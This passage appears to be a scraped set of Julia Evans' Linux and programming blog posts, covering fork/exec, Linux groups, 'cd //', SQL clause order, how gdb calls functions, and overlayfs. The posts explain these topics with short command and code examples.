organize it so that my child runs  exec(\"ls\") . That leaves us with \n\n my parent\n    |- me\n       |-- ls\n \n\n and once ls exits, I’ll be all by myself again. Almost \n\n my parent\n    |- me\n       |-- ls (zombie)\n \n\n At this point ls is actually a zombie process! That means it’s dead, but it’s waiting around for me in case I want to check on its return value (using the  wait  system call.) Once I get its return value, I will really be all alone again. \n\n my parent\n    |- me\n \n\n what fork and exec looks like in code \n\n This is one of the exercises you have to do if you’re going to write a shell (which is a\nvery fun and instructive project! Kamal has a great workshop on Github about how to do it:\n https://github.com/kamalmarhubi/shell-workshop ) \n\n It turns out that with a bit of work & some C or Python skills you can write a very\nsimple shell (like bash!) in C or Python in just a few hours (at least if you have someone sitting next to you who knows what they’re doing, longer if not :)). I’ve done this and it was awesome. \n\n Anyway, here’s what fork and exec look like in a program. I’ve written fake C pseudocode. Remember that  fork can fail! \n\n int pid = fork();\n// now i am split in two! augh!\n// who am I? I could be either the child or the parent\nif (pid == 0) {\n    // ok I am the child process\n    // ls will eat my brain and I'll be a totally different process \n    exec([\"ls\"])\n} else if (pid == -1) {\n    // omg fork failed this is a disaster \n} else {\n    // ok i am the parent\n    // continue my business being a cool program\n    // I could wait for the child to finish if I want\n}\n\n \n\n ok what does it mean for your brain to be eaten julia \n\n Processes have a lot of attributes! \n\n You have \n\n \n open files (including open network connections) \n environment variables \n signal handlers (what happens when you run Ctrl+C on the program?) \n a bunch of memory (your “address space”) \n registers \n an “executable” that you ran (/proc/$pid/exe) \n cgroups and namespaces (“linux container stuff”) \n a current working directory \n the user your program is running as \n some other stuff that I’m forgetting \n \n\n When you run  execve  and have another program eat your brain, actually almost everything\nstays the same! You have the same environment variables and signal handlers and open files and more. \n\n The only thing that changes is, well, all of your memory and registers and the program that you’re running. Which is a pretty big deal. \n\n why is fork not super expensive (or: copy on write) \n\n You might ask “julia, what if I have a process that’s using 2GB of memory! Does that mean every time I start a subprocess all that 2GB of memory gets copied?! That sounds expensive!” \n\n It turns out that Linux implements “copy on write” for fork() calls, so that for all the\n2GB of memory in the new process it’s just like “look at the old process! it’s the same!”.\nAnd then if the either process writes any memory, then at that point it’ll start copying.\nBut if the memory is the same in both processes, there’s no need to copy! \n\n why you might care about all this \n\n Okay, julia, this is cool trivia, but why does it matter? Do the details about which\nsignal handlers or environment variables get inherited or whatever actually make a\ndifference in my day-to-day programming? \n\n Well, maybe! For example, there’s this  delightful bug on Kamal’s blog . It talks about how Python sets the signal handler for SIGPIPE to ignore. So if you run a program from inside Python, by default it will ignore SIGPIPE! This means that the program will  behave differently  depending on whether you started it from a Python script or from your shell! And in this case it was causing a weird bug! \n\n So, your program’s environment (environment, signal handlers, etc.) can matter! It\ninherits its environment from its parent process, whatever that was! This can sometimes be\na useful thing to know when debugging. \n\n"},
{"url": "https://jvns.ca/blog/2017/11/20/groups/", "title": "How do groups work on Linux?", "content": "\n     \n\n Hello! Last week, I thought I knew how users and groups worked on Linux. Here is what I\nthought: \n\n \n Every process belongs to a user (like  julia ) \n When a process tries to read a file owned by a group, Linux a) checks if the user  julia  can\naccess the file, and b) checks which groups  julia  belongs to, and whether any of those groups\nowns & can access that file \n If either of those is true (or if the ‘any’ bits are set right) then the process can access the\nfile \n \n\n So, for example, if a process is owned by the  julia  user and  julia  is in the  awesome  group,\nthen the process would be allowed to read this file. \n\n r--r--r-- 1 root awesome     6872 Sep 24 11:09 file.txt\n \n\n I had not thought carefully about this, but if pressed I would have said that it probably checks the\n /etc/group  file at runtime to see what groups you’re in. \n\n that is not how groups work \n\n I found out at work last week that, no, what I describe above is not how groups work. In particular\nLinux does  not  check which groups a process’s user belongs to every time that process tries to\naccess a file. \n\n Here is how groups actually work! I learned this by reading Chapter 9 (“Process Credentials”) of  The Linux Programming Interface \nwhich is an incredible book. As soon as I realized that I did not understand how users and groups\nworked, I opened up the table of contents with absolute confidence that it would tell me what’s up,\nand I was right. \n\n how users and groups checks are done \n\n They key new insight for me was pretty simple! The chapter starts out by saying that user and group IDs are  attributes of the\nprocess : \n\n \n real user ID and group ID; \n effective user ID and group ID; \n saved set-user-ID and saved set-group-ID; \n file-system user ID and group ID (Linux-specific); and \n supplementary group IDs. \n \n\n This means that the way Linux  actually  does group checks to see a process can read a file is: \n\n \n look at the process’s group IDs & supplementary group IDs (from the attributes on the process,\n not  by looking them up in  /etc/group ) \n look at the group on the file \n see if they match \n \n\n Generally when doing access control checks it uses the  effective  user/group ID, not the real\nuser/group ID. Technically when accessing a file it actually uses the  file-system  ids but those\nare usually the same as the effective uid/gid. \n\n Adding a user to a group doesn’t put existing processes in that group \n\n Here’s another fun example that follows from this: if I create a new  panda  group and add myself\n(bork) to it, then run  groups  to check my group memberships – I’m not in the panda group! \n\n bork@kiwi~> sudo addgroup panda\nAdding group `panda' (GID 1001) ...\nDone.\nbork@kiwi~> sudo adduser bork panda\nAdding user `bork' to group `panda' ...\nAdding user bork to group panda\nDone.\nbork@kiwi~> groups\nbork adm cdrom sudo dip plugdev lpadmin sambashare docker lxd\n \n\n no  panda  in that list! To double check, let’s try making a file owned by the  panda  group and see\nif I can access it: \n\n $  touch panda-file.txt\n$  sudo chown root:panda panda-file.txt\n$  sudo chmod 660 panda-file.txt\n$  cat panda-file.txt\ncat: panda-file.txt: Permission denied\n \n\n Sure enough, I can’t access  panda-file.txt . No big surprise there. My shell didn’t have the  panda \ngroup as a supplementary GID before, and running  adduser bork panda  didn’t do anything to change\nthat. \n\n how do you get your groups in the first place? \n\n So this raises kind of a confusing question, right – if processes have groups baked into them, how\ndo you get assigned your groups in the first place? Obviously you can’t assign yourself more groups\n(that would defeat the purpose of access control). \n\n It’s relatively clear how processes I  execute  from my shell (bash/fish) get their groups – my\nshell runs as me, and it has a bunch of group IDs on it. Processes I execute from my shell are\nforked from the shell so they get the same groups as the shell had. \n\n So there needs to be some “first” process that has your groups set on it, and all the other\nprocesses you set inherit their groups from that. That process is called your  login shell  and\nit’s run by the  login  program ( /bin/login ) on my laptop.  login  runs as root and calls a C\nfunction called  initgroups  to set up your groups (by reading  /etc/group ). It’s allowed to set up\nyour groups because it runs as root. \n\n let’s try logging in again! \n\n So! Let’s say I am running in a shell, and I want to refresh my groups! From what we’ve learned\nabout how groups are initialized, I should be able to run  login  to refresh my groups and start a\nnew login shell! \n\n Let’s try it: \n\n $ sudo login bork\n$ groups\nbork adm cdrom sudo dip plugdev lpadmin sambashare docker lxd panda\n$ cat panda-file.txt # it works! I can access the file owned by `panda` now!\n \n\n Sure enough, it works! Now the new shell that  login  spawned is part of the  panda  group! Awesome!\nThis won’t affect any other shells I already have running. If I really want the new  panda  group\neverywhere, I need to restart my login session completely, which means quitting my window manager\nand logging in again. \n\n newgrp \n\n Somebody on Twitter told me that if you want to start a new shell with a new group that you’ve been\nadded to, you can use  newgrp . Like this: \n\n sudo addgroup panda\nsudo adduser bork panda\nnewgrp panda # starts a new shell, and you don't have to be root to run it!\n \n\n You can accomplish the same(ish) thing with  sg panda bash  which will start a  bash  shell that\nruns with the  panda  group. \n\n setuid sets the effective user ID \n\n I’ve also always been a little vague about what it means for a process to run as “setuid root”. It\nturns out that setuid sets the effective user ID! So if I ( julia ) run a setuid root process (like  passwd ), then the  real  user ID will be set to  julia , and the  effective  user ID will be set to  root . \n\n passwd  needs to run as root, but it can look at its real user ID to see that  julia  started the\nprocess, and prevent  julia  from editing any passwords except for  julia ’s password. \n\n that’s all! \n\n There are a bunch more details about all the edge cases and exactly how everything works in The\nLinux Programming Interface so I will not get into all the details here. That book is amazing.\nEverything I talked about in this post is from Chapter 9, which is a 17-page chapter inside a\n1300-page book. \n\n The thing I love most about that book is that reading 17 pages about how users and groups work is\nreally approachable, self-contained, super useful, and I don’t have to tackle all 1300 pages of it\nat once to learn helpful things :) \n\n"},
{"url": "https://jvns.ca/blog/2017/02/08/weird-unix-things-cd/", "title": "Weird unix thing: 'cd //'", "content": "\n     \n\n Today my friend Mat told me an interesting trivia fact about cd! \n\n Look at this interaction, where we try to  cd /tmp ,  cd //tmp , and  cd ///tmp , in bash and in fish. \n\n bork@kiwi/> bash\nbork@kiwi:/$ cd //tmp\nbork@kiwi://tmp$ echo $PWD\n//tmp\nbork@kiwi:/tmp$ cd ///tmp\nbork@kiwi:/tmp$ echo $PWD\n/tmp\nbork@kiwi://tmp$ fish\nWelcome to fish, the friendly interactive shell\nType help for instructions on how to use fish\nbork@kiwi:/tmp> cd //tmp\nbork@kiwi:/tmp> echo $PWD\n/tmp\n \n\n What is  //tmp ? What is happening? Why is  cd ///tmp  different from  cd //tmp ? Here’s what we know so far: \n\n are  /  and  //  the same file? \n\n Yes. We can check this with  stat . They both have the same inode number (256)\nso they are the same file. \n\n bork@kiwi:~$ stat /\n  File: '/'\n  Size: 244       \tBlocks: 0          IO Block: 4096   directory\nDevice: 16h/22d\tInode: 256         Links: 1\nAccess: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)\nAccess: 2017-02-08 23:13:55.647187990 -0500\nModify: 2017-01-10 13:01:30.987733887 -0500\nChange: 2017-01-10 13:01:30.987733887 -0500\n Birth: -\nbork@kiwi:~$ stat //\n  File: '//'\n  Size: 244       \tBlocks: 0          IO Block: 4096   directory\nDevice: 16h/22d\tInode: 256         Links: 1\nAccess: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)\nAccess: 2017-02-08 23:13:55.647187990 -0500\nModify: 2017-01-10 13:01:30.987733887 -0500\nChange: 2017-01-10 13:01:30.987733887 -0500\n Birth: -\n \n\n Cool. But what is  // ? Why doesn’t bash just correct it to  / ? \n\n the specification \n\n The specification for cd is  here \n\n Here’s the relevant section \n\n \n An implementation may further simplify curpath by removing any\ntrailing <slash> characters that are not also leading <slash>\ncharacters, replacing multiple non-leading consecutive <slash>\ncharacters with a single <slash>, and replacing three or more leading\n<slash> characters with a single <slash>. If, as a result of this\ncanonicalization, the curpath variable is null, no further steps shall\nbe taken. \n \n\n So! We can replace “three or more leading / characters with a single\nslash”. That does not say anything about what to do when there are 2  / \ncharacters though, which presumably is why  cd //tmp  leaves you at\n //tmp . \n\n Why is this the specification? Mat pointed out there is a “Rationale”\nsection in this spec, but it does not really explained. \n\n In another\n specification , it says: \n\n \n A pathname that begins with two successive slashes may be interpreted\nin an implementation-defined manner \n \n\n So you can define  //tmp  to mean whatever you want? Like it could be different\nthan  /tmp ? Why? Somebody on stack overflow said that this is related to the\ndouble slash in URLs (“http://“…) but didn’t provide a citation. Is that\ntrue? \n\n If I find out, I will update this blog post with an answer. \n\n update 1 : there seems to be a pretty good answer in  this stack overflow question \n\n"},
{"url": "https://jvns.ca/blog/2019/10/03/sql-queries-don-t-start-with-select/", "title": "SQL queries don't start with SELECT", "content": "\n     \n\n Okay, obviously many SQL queries do start with  SELECT  (and actually this post is only about  SELECT  queries, not  INSERT s or anything). \n\n But! Yesterday I was working on an  explanation of window\nfunctions , and I\nfound myself googling “can you filter based on the result of a window\nfunction”. As in – can you filter the result of a window function in\na WHERE or HAVING or something? \n\n Eventually I concluded “window functions must run after WHERE and GROUP BY\nhappen, so you can’t do it”. But this led me to a bigger question –  what\norder do SQL queries actually run in? . \n\n This was something that I felt like I knew intuitively (“I’ve written at least\n10,000 SQL queries, some of them were really complicated! I must know this!“)\nbut I struggled to actually articulate what the order was. \n\n SQL queries happen in this order \n\n I looked up the order, and here it is! (SELECT isn’t the first thing, it’s like the 5th thing!) ( here it is in a tweet ). \n\n \n(I really want to find a more accurate way of phrasing this than “sql queries\nhappen/run in this order” but I haven’t figured it out yet)\n \n\n \n \n \n\n In a non-image format, the order is: \n\n \n FROM/JOIN  and all the  ON  conditions \n WHERE \n GROUP BY \n HAVING \n SELECT  (including window functions) \n ORDER BY \n LIMIT \n \n\n questions this diagram helps you answer \n\n This diagram is about the  semantics  of SQL queries – it lets you reason through what a given query will return and answers questions like: \n\n \n Can I do  WHERE  on something that came from a  GROUP BY ? (no! WHERE happens before GROUP BY!) \n Can I filter based on the results of a window function? (no! window functions happen in  SELECT , which happens after both  WHERE  and  GROUP BY ) \n Can I  ORDER BY  based on something I did in GROUP BY? (yes!  ORDER BY  is basically the last thing, you can  ORDER BY  based on anything!) \n When does  LIMIT  happen? (at the very end!) \n \n\n Database engines don’t actually literally run queries in this order  because they\nimplement a bunch of optimizations to make queries run faster – we’ll get to\nthat a little later in the post. \n\n So: \n\n \n you can use this diagram when you just want to understand which queries are valid and how to reason about what results of a given query will be \n you  shouldn’t  use this diagram to reason about query performance or anything involving indexes, that’s a much more complicated thing with a lot more variables \n \n\n confounding factor: column aliases \n\n Someone on Twitter pointed out that many SQL implementations let you use the syntax: \n\n SELECT CONCAT(first_name, ' ', last_name) AS full_name, count(*)\nFROM table\nGROUP BY full_name\n \n\n This query makes it  look  like GROUP BY happens after SELECT even though GROUP BY is first, because the\nGROUP BY references an alias from the SELECT. But it’s not actually necessary\nfor the GROUP BY to run after the SELECT for this to work – the database engine can\njust rewrite the query as \n\n SELECT CONCAT(first_name, ' ', last_name) AS full_name, count(*)\nFROM table\nGROUP BY CONCAT(first_name, ' ', last_name)\n \n\n and run the GROUP BY first. \n\n Your database engine also definitely does a bunch of checks to make sure that what you\nput in SELECT and GROUP BY makes sense together before it even starts to run\nthe query, so it has to look at the query as a whole anyway before it starts to\ncome up with an execution plan. \n\n queries aren’t actually run in this order (optimizations!) \n\n Database engines in practice don’t actually run queries by joining, and then\nfiltering, and then grouping, because they implement a bunch of optimizations\nreorder things to make the query run faster  as long as reordering things won’t\nchange the results of the query. \n\n One simple example of a reason why need to run queries in a different order to\nmake them fast is that in this query: \n\n SELECT * FROM\nowners LEFT JOIN cats ON owners.id = cats.owner\nWHERE cats.name = 'mr darcy'\n \n\n it would be silly to do the whole left join and match up all the rows in the 2\ntables if you just need to look up the 3 cats named ‘mr darcy’ – it’s way\nfaster to do some filtering first for cats named ‘mr darcy’. And in this case\nfiltering first doesn’t change the results of the query! \n\n There are lots of other optimizations that database engines implement in\npractice that might make them run queries in a different order but there’s no\nroom for that and honestly it’s not something I’m an expert on. \n\n LINQ starts queries with  FROM \n\n LINQ (a querying syntax in C# and VB.NET) uses the order  FROM ... WHERE ... SELECT . Here’s an example of a LINQ query: \n\n var teenAgerStudent = from s in studentList\n                      where s.Age > 12 && s.Age < 20\n                      select s;\n \n\n pandas (my  favourite data wrangling\ntool ) also basically works like this,\nthough you don’t need to use this exact order – I’ll often write pandas code\nlike this: \n\n df = thing1.join(thing2)      # like a JOIN\ndf = df[df.created_at > 1000] # like a WHERE\ndf = df.groupby('something', num_yes = ('yes', 'sum')) # like a GROUP BY\ndf = df[df.num_yes > 2]       # like a HAVING, filtering on the result of a GROUP BY\ndf = df[['num_yes', 'something1', 'something']] # pick the columns I want to display, like a SELECT\ndf.sort_values('sometthing', ascending=True)[:30] # ORDER BY and LIMIT\ndf[:30]\n \n\n This isn’t because pandas is imposing any specific rule on how you have to\nwrite your code, though. It’s just that it often makes sense to write code in\nthe order JOIN / WHERE / GROUP BY / HAVING. (I’ll often put a  WHERE  first to\nimprove performance though, and I think most database engines will also do a\nWHERE first in practice) \n\n dplyr  in R also lets you use a different syntax for querying SQL databases\nlike Postgres, MySQL and SQLite, which is also in a more logical order. \n\n I was really surprised that I didn’t know this \n\n I’m writing a blog post about this because when I found out the order I was SO\nSURPRISED that I’d never seen it written down that way before – it explains\nbasically everything that I knew intuitively about why some queries are allowed\nand others aren’t. So I wanted to write it down in the hopes that it will help\nother people also understand how to write SQL queries. \n\n"},
{"url": "https://jvns.ca/blog/2018/01/04/how-does-gdb-call-functions/", "title": "How does gdb call functions?", "content": "\n     \n\n (previous gdb posts:  how does gdb work? (2016)  and  three things you can do with gdb (2014) ) \n\n I discovered this week that you can call C functions from gdb! I thought this was cool because I’d\npreviously thought of gdb as mostly a read-only debugging tool. \n\n I was really surprised by that (how does that WORK??). As I often do, I asked  on Twitter  how that\neven works, and I got a lot of really useful answers! My favorite answer was  Evan\nKlitzke’s example C code  showing a way to do it.\nCode that  works  is very exciting! \n\n I believe (through some stracing & experiments) that that example C code is different from how gdb\nactually calls functions, so I’ll talk about what I’ve figured out about what gdb does in this post\nand how I’ve figured it out. \n\n There is a lot I still don’t know about how gdb calls functions, and very likely some things in here\nare wrong. \n\n What does it mean to call a C function from gdb? \n\n Before I get into how this works, let’s talk quickly about why I found it surprising / nonobvious. \n\n So, you have a running C program (the “target program”). You want to run a function from it. To do\nthat, you need to basically: \n\n \n pause the program (because it is already running code!) \n find the address of the function you want to call (using the symbol table) \n convince the program (the “target program”) to jump to that address \n when the function returns, restore the instruction pointer and registers to what they were before \n \n\n Using the symbol table to figure out the address of the function you want to call is pretty\nstraightforward – here’s some sketchy (but working!) Rust code that I’ve been using on Linux to do that. This code uses the  elf crate .\nIf I wanted to find the address of the  foo  function in PID 2345, I’d run\n elf_symbol_value(\"/proc/2345/exe\", \"foo\") . \n\n fn elf_symbol_value(file_name: &str, symbol_name: &str) -> Result<u64, Box<std::error::Error>> {\n    // open the ELF file\n    let file = elf::File::open_path(file_name).ok().ok_or(\"parse error\")?;\n    // loop over all the sections & symbols until you find the right one!\n    let sections = &file.sections;\n    for s in sections {\n        for sym in file.get_symbols(&s).ok().ok_or(\"parse error\")? {\n            if sym.name == symbol_name {\n                return Ok(sym.value);\n            }\n        }\n    }\n    None.ok_or(\"No symbol found\")?\n}\n \n\n This won’t totally work on its own, you also need to look at the memory maps of the file and\nadd the symbol offset to the start of the place that file is mapped. But finding the memory maps\nisn’t so hard, they’re in  /proc/PID/maps . \n\n Anyway, this is all to say that finding the address of the function to call seemed straightforward\nto me but that the rest of it (change the instruction pointer? restore the registers? what else?)\ndidn’t seem so obvious! \n\n You can’t just jump \n\n I kind of said this already but – you can’t just find the address of the function you want to run\nand then jump to that address. I tried that in gdb ( jump foo ) and the program segfaulted. Makes\nsense! \n\n How you can call C functions from gdb \n\n First, let’s see that this is possible. I wrote a tiny C program that sleeps for 1000 seconds and\ncalled it  test.c : \n\n #include <unistd.h>\n\nint foo() {\n    return 3;\n}\nint main() {\n    sleep(1000);\n}\n \n\n Next, compile and run it: \n\n $ gcc -o test  test.c\n$ ./test\n \n\n Finally, let’s attach to the  test  program with gdb: \n\n $ sudo gdb -p $(pgrep -f test)\n(gdb) p foo()\n$1 = 3\n(gdb) quit\n \n\n So I ran  p foo()  and it ran the function! That’s fun. \n\n Why is this useful? \n\n a few possible uses for this: \n\n \n it lets you treat gdb a little bit like a C REPL, which is fun and I imagine could be useful for\ndevelopment \n utility functions to display / navigate complex data structures quickly while debugging in gdb\n(thanks  @invalidop ) \n set an arbitrary process’s namespace while it’s running  (featuring a not-so-surprising appearance from my colleague  nelhage !) \n probably more that I don’t know about \n \n\n How it works \n\n I got a variety of useful answers on Twitter when I asked how calling functions from gdb works! A\nlot of them were like “well you get the address of the function from the symbol table” but that is\nnot the whole story!! \n\n One person pointed me to this nice 2 part series on how gdb works that they’d written:  Debugging with the natives, part 1  and  Debugging with the natives, part 2 . Part 1 explains approximately how calling functions works (or could work – figuring out what gdb  actually  does isn’t trivial, but I’ll try my best!). \n\n The steps outlined there are: \n\n \n Stop the process \n Create a new stack frame (far away from the actual stack) \n Save all the registers \n Set the registers to the arguments you want to call your function with \n Set the stack pointer to the new stack frame \n Put a trap instruction somewhere in memory \n Set the return address to that trap instruction \n Set the instruction pointer register to the address of the function you want to call \n Start the process again! \n \n\n I’m not going to go through how gdb does all of these (I don’t know!) but here are a few things I’ve\nlearned about the various pieces this evening. \n\n Create a stack frame \n\n If you’re going to run a C function, most likely it needs a stack to store variables on! You definitely\ndon’t want it to clobber your current stack. Concretely – before gdb calls your function (by\nsetting the instruction pointer to it and letting it go), it needs to set the  stack pointer \nto… something. \n\n There was some speculation on Twitter about how this works: \n\n \n i think it constructs a new stack frame for the call right on top of the stack where you’re\nsitting! \n \n\n and: \n\n \n Are you certain it does that? It could allocate a pseudo stack, then temporarily change sp value\nto that location. You could try, put a breakpoint there and look at the sp register address, see\nif it’s contiguous to your current program register? \n \n\n I did an experiment where (inside gdb) I ran:` \n\n (gdb) p $rsp\n$7 = (void *) 0x7ffea3d0bca8\n(gdb) break foo\nBreakpoint 1 at 0x40052a\n(gdb) p foo()\nBreakpoint 1, 0x000000000040052a in foo ()\n(gdb) p $rsp\n$8 = (void *) 0x7ffea3d0bc00\n \n\n This seems in line with the “gdb constructs a new stack frame for the call right on top of the stack\nwhere you’re sitting” theory, since the stack pointer ( $rsp ) goes from being  ...bca8  to  ..bc00 \n– stack pointers grow downward, so a  bc00  stack pointer is  after  a  bca8  pointer.\nInteresting! \n\n So it seems like gdb just creates the new stack frames right where you are. That’s a bit surprising\nto me! \n\n change the instruction pointer \n\n Let’s see whether gdb changes the instruction pointer! \n\n (gdb) p $rip\n$1 = (void (*)()) 0x7fae7d29a2f0 <__nanosleep_nocancel+7>\n(gdb) b foo\nBreakpoint 1 at 0x40052a\n(gdb) p foo()\nBreakpoint 1, 0x000000000040052a in foo ()\n(gdb) p $rip\n$3 = (void (*)()) 0x40052a <foo+4>\n \n\n It does! The instruction pointer changes from  0x7fae7d29a2f0  to  0x40052a  (the address of the\n foo  function). \n\n I stared at the strace output and I still don’t understand  how  it changes, but that’s okay. \n\n aside: how breakpoints are set!! \n\n Above I wrote  break foo . I straced gdb while running all of this and understood almost nothing but\nI found ONE THING that makes sense to me!! \n\n Here are some of the system calls that gdb uses to set a breakpoint. It’s really simple! It replaces\none instruction with  cc  (which  https://defuse.ca/online-x86-assembler.htm  tells me means  int3 \nwhich means  send SIGTRAP ), and then once the program is interrupted, it puts the instruction back\nthe way it was. \n\n I was putting a breakpoint on a function  foo  with the address  0x400528 . \n\n This  PTRACE_POKEDATA  is how gdb changes the code of running programs. \n\n // change the 0x400528 instructions\n25622 ptrace(PTRACE_PEEKTEXT, 25618, 0x400528, [0x5d00000003b8e589]) = 0\n25622 ptrace(PTRACE_POKEDATA, 25618, 0x400528, 0x5d00000003cce589) = 0\n// start the program running\n25622 ptrace(PTRACE_CONT, 25618, 0x1, SIG_0) = 0\n// get a signal when it hits the breakpoint\n25622 ptrace(PTRACE_GETSIGINFO, 25618, NULL, {si_signo=SIGTRAP, si_code=SI_KERNEL, si_value={int=-1447215360, ptr=0x7ffda9bd3f00}}) = 0\n// change the 0x400528 instructions back to what they were before\n25622 ptrace(PTRACE_PEEKTEXT, 25618, 0x400528, [0x5d00000003cce589]) = 0\n25622 ptrace(PTRACE_POKEDATA, 25618, 0x400528, 0x5d00000003b8e589) = 0\n \n\n put a trap instruction somewhere \n\n When gdb runs a function, it  also  puts trap instructions in a bunch of places! Here’s one of\nthem (per strace). It’s basically replacing one instruction with  cc  ( int3 ). \n\n 5908  ptrace(PTRACE_PEEKTEXT, 5810, 0x7f6fa7c0b260, [0x48f389fd89485355]) = 0\n5908  ptrace(PTRACE_PEEKTEXT, 5810, 0x7f6fa7c0b260, [0x48f389fd89485355]) = 0\n5908 ptrace(PTRACE_POKEDATA, 5810, 0x7f6fa7c0b260, 0x48f389fd894853cc) = 0\n \n\n What’s  0x7f6fa7c0b260 ? Well, I looked in the process’s memory maps, and it turns it’s somewhere in\n /lib/x86_64-linux-gnu/libc-2.23.so . That’s weird! Why is gdb putting trap instructions in libc? \n\n Well, let’s see what function that’s in. It turns out it’s  __libc_siglongjmp . The other functions\ngdb is putting traps in are  __longjmp ,  ____longjmp_chk ,  dl_main , and  _dl_close_worker . \n\n Why? I don’t know! Maybe for some reason when our function  foo()  returns, it’s calling  longjmp ,\nand that is how gdb gets control back? I’m not sure. \n\n how gdb calls functions is complicated! \n\n I’m going to stop there (it’s 1am!), but now I know a little more! \n\n It seems like the answer to “how does gdb call a function?” is definitely not that simple. I\nfound it interesting to try to figure a little bit of it out and hopefully you have too! \n\n I still have a lot of unanswered questions about how exactly gdb does all of these things, but\nthat’s okay. I don’t really need to know the details of how this works and I’m happy to have a\nslightly improved understanding. \n\n"},
{"url": "https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/", "title": "How containers work: overlayfs", "content": "\n     \n\n I wrote a comic about overlay filesystems for a potential future container  zine \nthis morning, and then I got excited about the topic and wanted to write a blog\npost with more details. Here’s the comic, to start out: \n\n \n \n \n\n container images are big \n\n Container images can be pretty big (though some are really small, like  alpine\nlinux is 2.5MB ). Ubuntu 16.04 is\nabout 27MB, and  the Anaconda Python distribution is 800MB to\n1.5GB . \n\n Every container you start with an image starts out with the same blank slate,\nas if it made a copy of the image just for that container to use. But for big\ncontainer images, like that 800MB Anaconda image, making a copy would be both a\nwaste of disk space and pretty slow. So Docker doesn’t make copies – instead\nit uses an  overlay . \n\n how overlays work \n\n Overlay filesystems, also known as “union filesystems” or “union mounts” let you mount a filesystem using 2 directories: a “lower” directory, and an “upper” directory. \n\n Basically: \n\n \n the  lower  directory of the filesystem is read-only \n the  upper  directory of the filesystem can be both read to and written from \n \n\n When a process  reads  a file, the overlayfs filesystem driver looks in the upper\ndirectory and reads the file from there if it’s present. Otherwise, it looks in\nthe lower directory. \n\n When a process  writes  a file, overlayfs will just write it to the upper directory. \n\n let’s make an overlay with  mount ! \n\n That was all a little abstract, so let’s make an overlay filesystem and try\nit out! This is just going to have a few files in it: I’ll make upper and lower\ndirectories, and a  merged  directory to mount the combined filesystem into: \n\n $ mkdir upper lower merged work\n$ echo \"I'm from lower!\" > lower/in_lower.txt \n$ echo \"I'm from upper!\" > upper/in_upper.txt\n$ # `in_both` is in both directories\n$ echo \"I'm from lower!\" > lower/in_both.txt \n$ echo \"I'm from upper!\" > upper/in_both.txt \n \n\n Combining the upper and lower directories is pretty easy: we can just do it with  mount! \n\n $ sudo mount -t overlay overlay \n    -o lowerdir=/home/bork/test/lower,upperdir=/home/bork/test/upper,workdir=/home/bork/test/work \n    /home/bork/test/merged\n \n\n There’s was an extremely annoying error message I kept getting while doing\nthis, that said  mount: /home/bork/test/merged: special device overlay does not\nexist. . This message is a lie, and actually just means that one of the\ndirectories I specified was missing (I’d written  ~/test/merged  but it wasn’t being expanded). \n\n Okay, let’s try to read one of the files from the overlay filesystem! The file  in_both.txt  exists in both  lower/  and  upper/ , so it should read the file from the  upper/  directory. \n\n $ cat merged/in_both.txt \n\"I'm from upper!\n \n\n It worked! \n\n And the contents of our directories are what we’d expect: \n\n find lower/ upper/ merged/\nlower/\nlower/in_lower.txt\nlower/in_both.txt\nupper/\nupper/in_upper.txt\nupper/in_both.txt\nmerged/\nmerged/in_lower.txt\nmerged/in_both.txt\nmerged/in_upper.txt\n \n\n what happens when you create a new file? \n\n $ echo 'new file' > merged/new_file\n$ ls -l */new_file \n-rw-r--r-- 1 bork bork 9 Nov 18 14:24 merged/new_file\n-rw-r--r-- 1 bork bork 9 Nov 18 14:24 upper/new_file\n \n\n That makes sense, the new file gets created in the  upper  directory. \n\n what happens when you delete a file? \n\n Reads and writes seem pretty straightforward. But what happens with deletes? Let’s do it! \n\n $ rm merged/in_both.txt\n \n\n What happened? Let’s look with  ls : \n\n ls -l upper/in_both.txt  lower/lower1.txt  merged/lower1.txt\nls: cannot access 'merged/in_both.txt': No such file or directory\n-rw-r--r-- 1 bork bork    6 Nov 18 14:09 lower/in_both.txt\nc--------- 1 root root 0, 0 Nov 18 14:19 upper/in_both.txt\n \n\n So: \n\n \n in_both.txt  is still in the  lower  directory, and it’s unchanged \n it’s not in the  merged  directory. So far this is all what we expected. \n But what happened in  upper  is a little strange: there’s a file called\n upper/in_both.txt , but it’s a… character device? I guess this is how the\noverlayfs driver represents a file being deleted. \n \n\n What happens if we try to copy this weird character device file? \n\n $ sudo cp upper/in_both.txt upper/in_lower.txt\ncp: cannot open 'upper/in_both.txt' for reading: No such device or address\n \n\n Okay, that seems reasonable, being able to copy this weird deletion signal file doesn’t really make sense. \n\n you can mount multiple “lower” directories \n\n Docker images are often composed of like 25 “layers”. Overlayfs supports having\nmultiple lower directories, so you can run \n\n mount -t overlay overlay\n      -o lowerdir:/dir1:/dir2:/dir3:...:/dir25,upperdir=...\n \n\n So I assume that’s how containers with many Docker layers work, it just unpacks\neach layer into a separate directory and then asks overlayfs to combine them\nall together with an empty upper directory that the container will write its changes to it. \n\n docker can also use btrfs snapshots \n\n Right now I’m using ext4, and Docker uses overlayfs snapshots to run\ncontainers. But I used to use btrfs, and then Docker would use btrfs copy-on-write snapshots\ninstead. (Here’s a list of when Docker uses which  storage drivers ) \n\n Using btrfs snapshots this way had some interesting consequences – at some\npoint last year I was running hundreds of short-lived Docker containers on my\nlaptop, and this resulted in me running out of btrfs metadata space (like  this person ).\nThis was really confusing because I’d never heard of btrfs metadata before and it\nwas tricky to figure out how to clean up my filesystem so I could run Docker\ncontainers again. ( this docker github issue  describes a similar problem\nwith Docker and btrfs) \n\n it’s fun to try out container features in a simple way! \n\n I think containers often seem like they’re doing “complicated” things and I\nthink it’s fun to break them down like this – you can just run one  mount \nincantation without actually doing anything else related to containers at all\nand see how overlays work! \n\n"},
